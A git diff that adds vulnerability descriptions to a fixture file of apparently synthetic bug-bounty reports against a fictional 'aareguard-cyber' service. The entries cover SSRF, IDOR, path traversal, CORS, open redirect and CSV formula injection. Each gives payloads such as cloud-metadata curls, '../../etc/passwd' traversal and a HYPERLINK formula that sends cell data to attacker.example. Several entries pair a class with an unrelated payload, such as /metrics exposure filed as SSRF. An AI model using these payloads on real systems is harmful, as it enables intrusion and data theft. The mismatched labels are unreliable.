diff --git a/fixtures/reports/aareguard_cyber_reports.json b/fixtures/reports/aareguard_cyber_reports.json
index bb8d099..4bbf7df 100644
--- a/fixtures/reports/aareguard_cyber_reports.json
+++ b/fixtures/reports/aareguard_cyber_reports.json
@@ -50,7 +50,8 @@
           "offset": "2d",
           "message": "After allowlist+proxy, internal ranges blocked; external allowlisted domains succeed."
         }
-      ]
+      ],
+      "description": "The enrichment service processes URLs embedded in incident payloads and performs server-side fetches without an allowlist, CIDR block filters, or strict scheme/host validation. This enables a low-privileged analyst to coerce the service into making requests to link-local cloud metadata endpoints (e.g., 169.254.169.254), RFC1918/private addresses, or internal admin panels, resulting in server-side request forgery (SSRF). In testing, the service retrieved instance-profile/IAM metadata and persisted the response into the enrichment blob that later surfaces to analysts, demonstrating a clear data exfiltration and pivot pathway. The absence of DNS pinning and enforced egress proxy further increases exploit reliability and makes blind SSRF feasible via timing/error side channels.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.aareguard-cyber.foo/enrich`\n- Preconditions: authenticated user: customer analyst; app version: SOC 3.1\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Prepare a minimal incident payload that includes an indicator with a crafted url field pointing to http://169.254.169.254/latest/meta-data/.\n- Submit the incident to the enrichment service via POST /enrich with Content-Type: application/json and capture the returned incident/enrichment identifier.\n- Query the enrichment record (e.g., GET /api/v1/incidents/{id}/enrichment) and observe that the service performed a server-side request and persisted the response body.\n- Change the target to http://169.254.169.254/latest/meta-data/iam/ and repeat to demonstrate access to credential-related metadata.\n- Test additional internal targets (e.g., http://10.0.0.5:8080/health or http://127.0.0.1:80) to confirm that private/link-local ranges are not blocked and to observe timing differences when targets are reachable.\n- Optionally repeat using https:// scheme and mixed-case hostnames to confirm there is no strict allowlist, normalization, or scheme enforcement in place.\n- Review server logs (if accessible) or enrichment metadata to confirm status codes, response sizes, and caching behavior for these internal requests.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -187,7 +188,8 @@
           "offset": "7d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.aareguard-cyber.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -322,7 +324,8 @@
           "offset": "4d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.aareguard-cyber.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -452,7 +455,8 @@
           "offset": "6d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.aareguard-cyber.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -578,7 +582,8 @@
           "offset": "5d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -746,7 +751,8 @@
           "offset": "2d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.aareguard-cyber.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -870,7 +876,8 @@
           "offset": "4d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.aareguard-cyber.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -967,7 +974,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1102,7 +1110,8 @@
           "offset": "6d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.aareguard-cyber.foo/import`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1253,7 +1262,8 @@
           "offset": "3d 23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.aareguard-cyber.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1377,7 +1387,8 @@
           "offset": "2d 5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.aareguard-cyber.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1497,7 +1508,8 @@
           "offset": "1d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1600,7 +1612,8 @@
           "offset": "3d",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.aareguard-cyber.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1764,7 +1777,8 @@
           "offset": "3d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.aareguard-cyber.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1896,7 +1910,8 @@
           "offset": "4d",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.aareguard-cyber.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2072,7 +2087,8 @@
           "offset": "4d 5h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.aareguard-cyber.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2224,7 +2240,8 @@
           "offset": "2d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.aareguard-cyber.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2371,7 +2388,8 @@
           "offset": "4d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.aareguard-cyber.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2499,7 +2517,8 @@
           "offset": "2d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2626,7 +2645,8 @@
           "offset": "4d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.aareguard-cyber.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2778,7 +2798,8 @@
           "offset": "4d 16h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2936,7 +2957,8 @@
           "offset": "5d 14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3063,7 +3085,8 @@
           "offset": "4d 13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.aareguard-cyber.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3170,7 +3193,8 @@
           "offset": "20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.aareguard-cyber.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3290,7 +3314,8 @@
           "offset": "2d 21h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.aareguard-cyber.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3425,7 +3450,8 @@
           "offset": "5d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.aareguard-cyber.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3562,7 +3588,8 @@
           "offset": "2d 23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.aareguard-cyber.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3698,7 +3725,8 @@
           "offset": "2d 23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.aareguard-cyber.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3862,7 +3890,8 @@
           "offset": "7d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.aareguard-cyber.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3954,7 +3983,8 @@
           "offset": "12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
